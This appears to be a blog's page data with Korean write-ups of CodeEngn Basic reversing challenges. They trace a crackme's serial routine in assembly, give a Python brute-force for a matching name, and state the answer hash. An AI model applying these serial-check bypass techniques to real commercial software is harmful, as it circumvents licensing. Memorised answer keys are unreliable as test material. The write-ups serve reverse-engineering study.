url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAIAAAA7N+mxAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABf0lEQVR42nXP23KbQAwGYNkJDQRWix1gOXix2SMLC8bYz9aX6EWnb9ypnek0nUQXuvn1jST4EYW/wvDn6cT2+/rQzPPEOX+NIuvcvMyuN7bXSquWH9pjW9Ul5welJGM5IQRYU4neLNc1RcyL3Fibve0RcRhHP3mtOmu1EF0ch4gkjl+TJEYkuzQlJIGqYkrLZTlTSqu6FlIiIVm2W9eLnycpO++dlB3iJgzh3wqC4B1fr1dKad008/kc3ads349+FEKcz5PojpsNbO4FAI/+jrVWl8tCEYuiMLYPgmcAMNaMflTyNPlBiBPc0SebtVa32xURm6aRSiVJnFLivR9GJ+XJOcNYHsfw8u2Ls9f1QillJZNKEpJQJNM8j9Ofn4fBai2SePMlvt1WirSsyrblj8z2vXPOGGWtLln+99UPuK5LrdXkxzRNizwLw5dHZqzpJ907WxQZAGy3/9k7LoqM84NzbkdTiliW7On5CQAadyDfSbREQRdACnAE4ADbD/g3H4IxsAf4TCUAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/91b07704f7d5a60b4e7afdf20ef9d477/c9b55/23.webp 165w,\n/static/91b07704f7d5a60b4e7afdf20ef9d477/f2908/23.webp 330w,\n/static/91b07704f7d5a60b4e7afdf20ef9d477/649fd/23.webp 429w\"\n              sizes=\"(max-width: 429px) 100vw, 429px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/91b07704f7d5a60b4e7afdf20ef9d477/04c57/23.png 165w,\n/static/91b07704f7d5a60b4e7afdf20ef9d477/d9ecf/23.png 330w,\n/static/91b07704f7d5a60b4e7afdf20ef9d477/3d026/23.png 429w\"\n            sizes=\"(max-width: 429px) 100vw, 429px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/91b07704f7d5a60b4e7afdf20ef9d477/3d026/23.png\"\n            alt=\"making ESI 1\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 91px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 131.86813186813185%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAaCAIAAAA44esqAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAD+UlEQVR42m1UaVMiSRTMqj6gOYZTjgVsWxuQ0xCQG1qloVE8aI9xPFbd0RVnHOeDX/bvb1ShhsZuxYuK5FFJvcqXD+QrVWvQrVUq+Xyh36lTAQpQBnQgDeT5nvkMFoEU+Nrcn1zZ1u3D7PLq8vrsGEAcxAZMYA/YB4bA5A3sAIfAOtCak/3B8GqumMnomdWstpSUJZECMSDIY+EDCAAhHjFg+ZUcCqeS8WAwuJhMhIMBSgnlp708/P8H3IBrTt799vWfl5+bzdL2zsHL0x2AP0DOgF1gCtifwSFwDDSA3pysZVeb9VpWV3PlUrNekyVhLtjKmzz6Z5Djyq3PyZLs9Pr8/kDA7/UoLjelBGCCO3g4P+zvQObBVmc8vjm1zM2efXZ+Np0ACIOMgDZgANtA5z+gyzEFUOsb9mRgjYzx1Lb3d0SBBACTkDrQJex0k9IuIQbQIKTDQZOQFmG6glBRdrodksMhy7JDEQSWdAASDxkQeMiACIiESBw45mWXm619q78z2RsOt4xOE4A3FKxWiqv5teJqYS1X2BqOd6ZH3V5PX1lUtaV2t1eplPKFLNPGPDqe/Wn/mP39+Pz8eH/NHKKpJ3tmY6PbaDabG43Lv+4L5TVtWe9slHvNWmppZWQ0rKHBlJVlRyAUDvi+BP1+n88vMJcIHr/fF1oIxKKhaMzt94uyJMiy84svEAqKkiwritvrYWUnl/XKWk7V1JXsarlcEih76iL3Y4RbLcY/VkCqQJQZkyT5V3wwDvbODza3zP7+8cX32zNZYqcPgRFvyTo30zVwAmwCd0CR9+l6Tlb1TLVay+f0fL6ka2zUFEKy/DaNkxMcZPi1Re6z1LvDBFHyeD1ul0uWJEVRuMFYY+atonwX+SS4ec/Et+axZZ1+fbo9/vX8++r7/Wx243Kw99i87D57KvPJBTADTvmEr/H86Zxcqjcmo629sWlNbKNTBRAgpMcLq/BzJW7JOp+WzpsQr2UTKkoORRREURQESWKZz2ULH6p9z7wORrVv2ONOq91o9+utanl+c4f/dpWP7jpQewPzTIVjJk57aB5NBtumMTA77UoRQJTSXUp6hJiUDAnpc2BRwaDCgNIRJQalfUqZZg6nKxBa8Pm8brc7HA6BF+bh8iqAmxCF49fBJq+j7nrv80atVMjl0hkto2sAnB7vsq4m1FRCTYTDgURqUdXStVZ3yzLz5byeTuvZvJ7WGXlyfv7y8O3y/Gh6cTK1DGbY7MqFbR2OBtbewOxVR/3hj58vt/d3j78efj/d7+5alxc39nSXkRfiiVwuV8ilU2pCX1lif0xORU3EI9FIPB5N61okFE0kFmPxSDKZzOi6pqnxWCwSYe7+F5u3md5bHQNeAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/26f1988445cd2324a968ff24c5f03895/11200/24.webp 91w\"\n              sizes=\"(max-width: 91px) 100vw, 91px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/26f1988445cd2324a968ff24c5f03895/3dc3c/24.png 91w\"\n            sizes=\"(max-width: 91px) 100vw, 91px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/26f1988445cd2324a968ff24c5f03895/3dc3c/24.png\"\n            alt=\"making ESI 2\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>ESI 생성 과정과 그 시작 부분의 레지스터 값들이다. LOCAL.1에는 23350E8이 들어 있다. 다음은 각 어셈블리어 코드 한줄 한줄 진행 과정에 따른 분석이다.</p>\n<p>| MOV EBX,DWORD PTR SS:[LOCAL.1] | EBX에 23350E8을 넣는다. |\r\nMOVZX ESI,BYTE PTR DS:[ECX+EBX-1] | ESI에 ECX+EBX-1 주소지에 들어있는 값을 넣는다. ECX가 1이므로 EBX 주소지에 있는 값을 그대로 ESI에 넣게 된다. 이 주소지에는 41이라는 값이 들어 있으므로, | ESI는 41이 된다. |\r\n| ADD ESI,EDX | ESI와 EDX를 더해서 ESI에 넣는다. EDX는 0이므로 ESI는 그대로 41이 된다. |\r\n| IMUL ESI,ESI,772 | ESI와 772를 곱한 결과를 ESI에 넣는다. ESI에는 1E3F2가 담긴다. |\r\n| MOV EDX,ESI | EDX에 ESI에 있는 1E3F2를 넣는다. |\r\nIMUL EDX,ESI | EDX와 ESI를 곱한 결과를 EDX에 넣는다. 1E3F2의 제곱인  392DB10C4가 들어가야 | 하지만 3이 잘리므로 결과적으로 92DB10C4가 EDX에 들어가게 된다. |\r\nADD ESI,EDX | ESI와 EDX를 더한 결과를 ESI에 넣는다. 1E3F2와 92DB10C4를 더하므로 ESI에는 | 92DCF4B6이 들어가게 된다. |\r\n| OR ESI,ESI | ESI와 ESI를 OR연산을 하면 값이 그대로 유지된다. |\r\nIMUL ESI,ESI,474 | ESI와 474를 곱한 값이 ESI에 담긴다. 92DCF4B6과 474를 곱하면 28DFFF1BA78이 | 되지만 28D가 잘리므로 FFF1BA78이 ESI에 담기게 된다. |\r\nADD ESI,ESI | FFF1BA78의 두 배인 값이 ESI에 담긴다. 1FFE374F0이 결과이나 1이 잘려 FFE374F0이 | ESI에 담긴다. |\r\n| MOV EDX,ESI | EDX에 ESI값을 넣는다. EDX에 FFE374F0이 담긴다. |\r\n| INC ECX | ECX에 1을 더한다. 2가 ECX에 담긴다. |\r\n| DEC EAX | EAX에 1을 뺀다. 0이 EAX에 담긴다. |</p>\n<p>이렇게 ESI에 담긴 FFE374F0의 앞 4자리는 그대로 시리얼 키의 맨 앞인 FFE3이 된다. 위의 알고리즘을 보면 결국 LOCAL.1에 담겨 있는 주소지, 즉 23350E8에 어떤 수가 들어 있느냐에 따라 최종 시리얼 키의 맨 앞자리 값이 바뀐다는 결론을 내릴 수 있다. Name에 넣은 A는 아스키코드로 65, 16진수로 41이다. 시험삼아 Name에 B를 넣고 23350E8를 확인해 보니 42가 담겨 있었다. 즉, Name에 들어간 아스키 코드에 따라 최종 시리얼 키의 맨 앞자리 값이 결정된다. 위의 루틴에 따라 아래와 같은 파이썬 코드를 작성하였다.</p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">namecode <span class=\"token operator\">=</span> <span class=\"token number\">0x21</span>\r\n<span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>namecode <span class=\"token operator\">&lt;</span> <span class=\"token number\">0x7f</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\r\n\tesi <span class=\"token operator\">=</span> namecode\r\n\tesi <span class=\"token operator\">=</span> esi <span class=\"token operator\">*</span> <span class=\"token number\">0x772</span>\r\n\tedx <span class=\"token operator\">=</span> esi\r\n\tedx <span class=\"token operator\">=</span> edx <span class=\"token operator\">*</span> esi\r\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>edx <span class=\"token operator\">></span> <span class=\"token number\">0xffffffff</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\r\n\t\tedx <span class=\"token operator\">=</span> edx <span class=\"token operator\">%</span> <span class=\"token number\">0x100000000</span>\r\n\tesi <span class=\"token operator\">=</span> edx <span class=\"token operator\">+</span> esi\r\n\tesi <span class=\"token operator\">=</span> esi <span class=\"token operator\">*</span> <span class=\"token number\">0x474</span>\r\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>esi <span class=\"token operator\">></span> <span class=\"token number\">0xffffffff</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\r\n\t\tesi <span class=\"token operator\">=</span> esi <span class=\"token operator\">%</span> <span class=\"token number\">0x100000000</span>\r\n\tesi <span class=\"token operator\">=</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> esi\r\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>esi <span class=\"token operator\">></span> <span class=\"token number\">0xffffffff</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\r\n\t\tesi <span class=\"token operator\">=</span> esi <span class=\"token operator\">%</span> <span class=\"token number\">0x100000000</span>\r\n\t<span class=\"token keyword\">print</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>esi<span class=\"token punctuation\">)</span>\r\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>esi <span class=\"token operator\">>=</span> <span class=\"token number\">0xbeda0000</span> <span class=\"token keyword\">and</span> esi <span class=\"token operator\">&lt;</span> <span class=\"token number\">0xbedb0000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\r\n\t\t<span class=\"token keyword\">print</span> <span class=\"token string\">\"Find it!\"</span>\r\n\t\t<span class=\"token keyword\">print</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>esi<span class=\"token punctuation\">)</span>\r\n\t\t<span class=\"token keyword\">print</span> <span class=\"token string\">\"Name is \"</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>namecode<span class=\"token punctuation\">)</span>\r\n\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\r\n\tnamecode <span class=\"token operator\">=</span> namecode <span class=\"token operator\">+</span> <span class=\"token number\">1</span></code></pre></div>\n<p>Name은 F가 나왔다. 이를 확인해 보았다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 364px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 50.909090909090914%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAIAAAA7N+mxAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAB3klEQVR42nXQ3Y7SQBQH8D6Hb6TrbowmxsQbWfdOfQV9JfkS2KhADIkp6C60006ntJ1Od2agpZ1C+VphWgOrRi/8XZ7kf84/Ryn+I8/zoiiWy+XlZavZbLRazcaHeq1WrdWq9XqtUi5XKmUly7L0X4wxQoiP/TCKVFW9OC+dl16UXl48f/b09OT+2enJ2cMHTx4/evP6lRIfiaO7sI3s4fB6NNKQbQ/6g7HjJNEkm3HOGOOccUYZ5Zxr2kgRQiyORJLcLZrP08Vvwc3Nbruy4917kEmZy73M81xKWRQFpVRJ0xTZY6ADSvl6vd78ZXt7S/mkkJt3DXbvrY4ID7CHPcwY/xUWInU9TAjB2Pd9EhDiE+L7PsaHIYRwu1mJtdT56vjE/M/lseMeagckCMPQcVwb2dh1IbQcx7EgRAgZhiHSNM9lXki530t5qL3b/SiKwjShkghh0UTD4XdE+4Z/5VBAoiGeRbM4CkMAAKU0W8wxCzsjr9MHte6gpzlfIbUgVKJYqIgN7aDT16qfet0BuEKkoxE/oJ7rtNttxth2vQqm8cdrr/vNLH9WvwzHPZMiy1JSIaJYsFBM43SaLCazlEViOhNJkgghGKO6rgEADAMYhmGYpmVZOjAsCFW1/xNU1AceTuNxGgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/b4d8c099c457753238af58262a5d2ed6/c9b55/25.webp 165w,\n/static/b4d8c099c457753238af58262a5d2ed6/f2908/25.webp 330w,\n/static/b4d8c099c457753238af58262a5d2ed6/1555d/25.webp 364w\"\n              sizes=\"(max-width: 364px) 100vw, 364px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/b4d8c099c457753238af58262a5d2ed6/04c57/25.png 165w,\n/static/b4d8c099c457753238af58262a5d2ed6/d9ecf/25.png 330w,\n/static/b4d8c099c457753238af58262a5d2ed6/e45a9/25.png 364w\"\n            sizes=\"(max-width: 364px) 100vw, 364px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/b4d8c099c457753238af58262a5d2ed6/e45a9/25.png\"\n            alt=\"well done\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>정답은 Name의 md5 hash값이다.</p>\n<p>정답: 800618943025315f869e4e1f09471012</p>","categories":["writeup","wargame","reversing"],"date":"July 21, 2015","description":null,"id":"61b1eec8-eaa3-5445-89e5-b940fab3fa4f","keywords":["codeengn-basic"],"slug":"/CodeEngn-Basic-WriteUp-17/","title":"CodeEngn Basic 17","readingTime":{"text":"11 min read"}},{"banner":{"alt":null,"caption":null,"src":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","backgroundColor":"#f8f8f8","images":{"fallback":{"src":"/static/c7ea4b8ee476c7d86db5906f8aa7d4af/22cca/0.png","srcSet":"/static/c7ea4b8ee476c7d86db5906f8aa7d4af/4d08c/0.png 63w,\n/static/c7ea4b8ee476c7d86db5906f8aa7d4af/a1dc6/0.png 126w,\n/static/c7ea4b8ee476c7d86db5906f8aa7d4af/22cca/0.png 251w","sizes":"(min-width: 251px) 251px, 100vw"},"sources":[{"srcSet":"/static/c7ea4b8ee476c7d86db5906f8aa7d4af/ca5ef/0.webp 63w,\n/static/c7ea4b8ee476c7d86db5906f8aa7d4af/0e223/0.webp 126w,\n/static/c7ea4b8ee476c7d86db5906f8aa7d4af/f9c07/0.webp 251w","type":"image/webp","sizes":"(min-width: 251px) 251px, 100vw"}]},"width":660,"height":399.68127490039836}}}},"body":"<p>Name이 CodeEngn일때 Serial은 무엇인가</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 251px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 78.7878787878788%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAIAAACZeshMAAAACXBIWXMAAA7DAAAOwwHHb6hkAAADpklEQVR42k3He0waBxzA8UvapH81c24WV7MpNe3EWZ+d67Y/9kcVLDZNNksHMto9auujTkmnVpd1Nu3SP1ZtU7e4xMXpFhRHfeCgWHoCB6Jwx3HcHWeBQx4H8rIt4HDJ/ltYH9svn/x+3x9w5PLosZZusaBJJBJ9+vlZibj5jET8iVgsFApPnuDzuPX84zwet57HrePzG443cLn1dY2N/I9PCxp49QDv2tQXA9cGOluu9EgH+6Rfd1/Mknb2tF9okwhbJaLOz86cbz59QSxslzS3ikXnhII2SfPl9tazQgHww4xGOg52TWh7pnRfTev6ZqF+penSnP6S0tC/ZO5Wgv0PTFL1csfi/W4NKF1a7gWhXhBqU2l/MpgAwR1w76Al/8ZaznXj/hGkaBwvnaXZv5NFC1SFMXjgwXotET1odrHNzjKnv4Sgq+jQ+6FEIeHtQElAdEeb943pze+tB25aCofXOGNYzYy7Vump+sNVZ403UsljZOzDzZ2mxF/88BNuKHFiK3Xy0fYHscddCA6cGtbs/lKT06vNG4SKhpGSUaxsknp7zlu14D6y5KtYclfq6XK96ygaOKjDiiHsMOriWPDXVrAOCwZ8dPPerouagm9NOQNg3lXToRFH6c9EtdxdO+9lTyCv/2otkFlemdDvmzG9qoBy7+pfnjfkKnV7FnWtKzDQNKTZ03W/+Lo1/4qRNWhkD6Glo3j5L9Q7Cm+FnOLIcbYMYU2usKZX8hVm1px5v2p1n9Kwe1Z73mgBRCPg3j5D0VUz+zu4+AZyaMhRMoKXjTmrZZ7yqYecKbJwAimYtBbIYZbc/MYizJo3597V7VJoWyALcG4M4gwRNbexqltY5S2s8jZe/SN5dHz93d/c7017amTOChn+lgwtU9gPL2Dl9xwlaqRwDnpJAXZAVsCEUjqMXnNtIt6obSNm24ij/jgW3LJnJdBA3BaM25g4Goqj4QQajtvCMSsTsYSjNu8GgDscGGINB4Opx1s726mnMunkTvrZfiGTev6mkn9n/gz6fQBqQ81r8IY/mNh6lEyns1LpVDor+X+p//pJKrWdyfj8fsDjcdM0HQqFIpHNaDQSiUSiT8+/8aJjsWfx/I3RNA34fL5YLLpqXlWr1DbUzjCM3+9nGMb1cF2lVoPLOg9NMwwTCASCwaDb7VKp1ARJhcNhl8sF2O0oSRJ2OwrDVgzDSJJwZofEcQcMWxEYJgjc6SQpykmSBEHgCII4HA6KctpsyD/XN3Ctd4qRkQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/c7ea4b8ee476c7d86db5906f8aa7d4af/c9b55/0.webp 165w,\n/static/c7ea4b8ee476c7d86db5906f8aa7d4af/ceeba/0.webp 251w\"\n              sizes=\"(max-width: 251px) 100vw, 251px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/c7ea4b8ee476c7d86db5906f8aa7d4af/04c57/0.png 165w,\n/static/c7ea4b8ee476c7d86db5906f8aa7d4af/26abe/0.png 251w\"\n            sizes=\"(max-width: 251px) 100vw, 251px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/c7ea4b8ee476c7d86db5906f8aa7d4af/26abe/0.png\"\n            alt=\"crackme\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>프로그램은 다음과 같이 Name과 Serial을 넣게 되어 있다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 399px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.96969696969697%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAB6klEQVR42mWS227aQBCG/ZBVEkhIVfWiJOpdH6BP1dw0grR4aYjAXhe8Nrb3bNaYXa8P5QEqg1JF6qfR6JdmfmlGM87HL1/Hd3f340+f78c3g8vh1cVwcNHn/+L2Zji8uhhdDwaX7z68H92Orh3XBRDCH09P7sydTqePj98BcIHrurPZZDJZLJ7nwAUAzAGYTqcAgFnPz9Vq+fDwzZEyb5tmXxScc6WK3W5HGaOECimFkJxzKSTjnDEuhGCUYUIKpYwxm83GyTKMs0zmeS5lmmZCyKZp/vR0Xdcdj0cpc0KoUmq/L5QqjsdjXdfW2t6cJCkKEcYUp6m38pIkraqqfqVpGiFkHMeEEJymURQzyor93hjj+76DohihKEkSSggKEef87Gmapq7rtm0JoWEYJkmCsywMQ7QJi6KwlYUQ9mMzyjjjUoqyPHRdZ619a+acb7fb887b7ZZQVte11trzPaco1LnPWlvZnvPA9pV/K7wtdV1HCHF+B4Hn+xBChFB5OFRVZW1ljNFan7TVWhtjqhNnrbVu2zZNUwfjDPowCAKZ7wjB0Iee5zPGDodyuVytN2FZllrr9XodRbFSShsTR5GUOULI6d9gPn/+NV8sXiilpD9cxk/gDGOMhRC9PsE5JwS/LBZBELiz2V968iFLVtkkUAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/5a5eaef5484fd12d3b9716a2c296564c/c9b55/1.webp 165w,\n/static/5a5eaef5484fd12d3b9716a2c296564c/f2908/1.webp 330w,\n/static/5a5eaef5484fd12d3b9716a2c296564c/66086/1.webp 399w\"\n              sizes=\"(max-width: 399px) 100vw, 399px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/5a5eaef5484fd12d3b9716a2c296564c/04c57/1.png 165w,\n/static/5a5eaef5484fd12d3b9716a2c296564c/d9ecf/1.png 330w,\n/static/5a5eaef5484fd12d3b9716a2c296564c/a307d/1.png 399w\"\n            sizes=\"(max-width: 399px) 100vw, 399px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/5a5eaef5484fd12d3b9716a2c296564c/a307d/1.png\"\n            alt=\"PEiD\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>아무런 패킹도 되어있지 않다. 이대로 분석을 진행한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 27.878787878787882%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAIAAABM9SnKAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABQElEQVR42j2MXUvCUByH/5t7PXvRLd1mc+dsphvq2aG6q6DErqKvom0zEASL4feSiOhiOL9TzIt+Vz94eB7Ii6/1+2Gz+f74PJZlvdvVy2W1WlWrZfWW/ebZoSh+yrLe74/bbZVlxzw/rdenPK+L4gSudx/HL3HyGuB5NHz2vDsAzHERANZ1GoYL33/C4cLrP/T7jz1nLklUkpkgTEWRQRD0KB0zlsQxntEIYw8AWi0OAMy2niSYEJfSK8dt27bWact8Q4DjoDmYEErTNGWj0Wg6m4QEnxkPAIZhxvEYE4IJQQgJgiiKkiCIiqLyfKtpYBwwxq5vbpMkTtmMkOAsN33DNCeTJAwJCYlldSzLclzXti3HcQxdRwiB4/SiZkPfv8R40O1e/MuapgfBwPVc1/MQUhVFVhFSVFVWFISQput/eNU7QpjM6LMAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/5537a5c286d5653d163e52dc581bf35a/c9b55/2.webp 165w,\n/static/5537a5c286d5653d163e52dc581bf35a/f2908/2.webp 330w,\n/static/5537a5c286d5653d163e52dc581bf35a/ff4b8/2.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/5537a5c286d5653d163e52dc581bf35a/04c57/2.png 165w,\n/static/5537a5c286d5653d163e52dc581bf35a/d9ecf/2.png 330w,\n/static/5537a5c286d5653d163e52dc581bf35a/32056/2.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/5537a5c286d5653d163e52dc581bf35a/32056/2.png\"\n            alt=\"string\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>모든 string을 참조하는 것으로 시작했다. 이를 바탕으로 시리얼의 판별 부분을 찾았다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 24.848484848484848%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA8UlEQVR42lXLzVLCMBRA4ZtW2tyEhBmphZLk5scpQ4cqqNRaWapbV77/sziw41uc3YFhPJ3Pn+PHeNx16e+n/p2KGrgV/snTkYgoxmitM8a6W0QEb6fXaZqG9+HQ9+awVfv7fAXcoSNnatM0Tdu2fd933c578v6a4InIGAPNZh1CCCn5zaoaX8T3s9jeYYfcciYZACCinEtE5LxE5GVZcs6LYgYAYOzmMaUQw0KqOKX1l4EKWMOYAFZcZn5VFDN2AYxljLEsy/I8ByIbYzDOpWDnJuDeqYQiSrVUGWQAoLWu64eqWi60FohaayHlXCmt1D/1ExsIu1+dGgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/ef3e4ba0aeb88a69b3e6a03b5d398ecd/c9b55/3.webp 165w,\n/static/ef3e4ba0aeb88a69b3e6a03b5d398ecd/f2908/3.webp 330w,\n/static/ef3e4ba0aeb88a69b3e6a03b5d398ecd/ff4b8/3.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/ef3e4ba0aeb88a69b3e6a03b5d398ecd/04c57/3.png 165w,\n/static/ef3e4ba0aeb88a69b3e6a03b5d398ecd/d9ecf/3.png 330w,\n/static/ef3e4ba0aeb88a69b3e6a03b5d398ecd/32056/3.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/ef3e4ba0aeb88a69b3e6a03b5d398ecd/32056/3.png\"\n            alt=\"EAX\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>EAX값의 OR연산 결과를 바탕으로 시리얼 값 판별을 진행하는 것을 확인하였다. EAX가 0이 되어야만 정답 판정을 받을 수 있다. 현재 EAX값은 1이므로 OR연산을 했을 때 EAX값은 1이다. EAX값의 결과는 위의 함수 &#x3C;JMP.&#x26;kernel32.lstrcmpiA>에서 발생한다. 해당 함수 이전에 중단점을 걸고 진행시킨 후 함수를 관찰하려고 한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 359px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 52.121212121212125%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAIAAAA7N+mxAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABkElEQVR42n1Qy46bQBBsFttADLF3gGGePY9uWGPtn+WnckokW5tc8oGRyR58SqkOpVaXqrqhsapdLt07Bf7G9GdZbstyZ/6Y5w/mG9G9Fz8Rb9N0a77c2/bedb++nn5Xhx8A30HJIce0vs0zpxDGGCfEMWVLyWJQiP3r+Wid8E44L3IeiNR6dZPsAADGsfcYeJmZGH2IMcdIk7LWeMRkjD2fhRDSGCelHYepOtR105ZlBbADrWXKtF7emHJM0SN6Z7VWKafT6VRVh/1+fzjsq6pqmma32xVFUZYvZVluyYNADDEi5eS9RXTO2ZQTM3nvrNXn80kpaY3W2nhnrDOIvuvah1mpMcZETDPlEH2MIaWgtEbvtVZCvLbHY9d1w9D3/dC2R3jGJD/Nj9oxEGVnTUopBKzrGv6Pf7VDQKbsvOWZc45KK2tM3TSfS0WxcRPP0EqmlNfrmmPAEIj4er1OkzLoL227AlwABIAEYAC1cdmGjwPk2CMGZk4xOOf840tGW9MPw7FpCoAStkiAl43P4i8CAjgIwZPhhgAAAABJRU5ErkJggg=='); 